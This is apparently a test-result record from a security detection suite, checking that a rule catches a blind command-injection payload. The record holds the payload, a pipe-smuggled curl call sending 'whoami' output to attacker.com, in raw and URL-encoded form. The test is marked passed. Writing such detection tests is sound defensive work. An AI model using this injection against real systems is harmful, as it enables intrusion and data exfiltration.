name: test_e2e_with_logs[323_CMD_BLIND_003]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_003` |
| **Name** | Out-of-band data exfiltration via curl |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| curl http://attacker.com/callback?data=`whoami``
- **Encoded**: `%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 14:27:51.000 UTC

| **Rule Match** | ✅ Match |
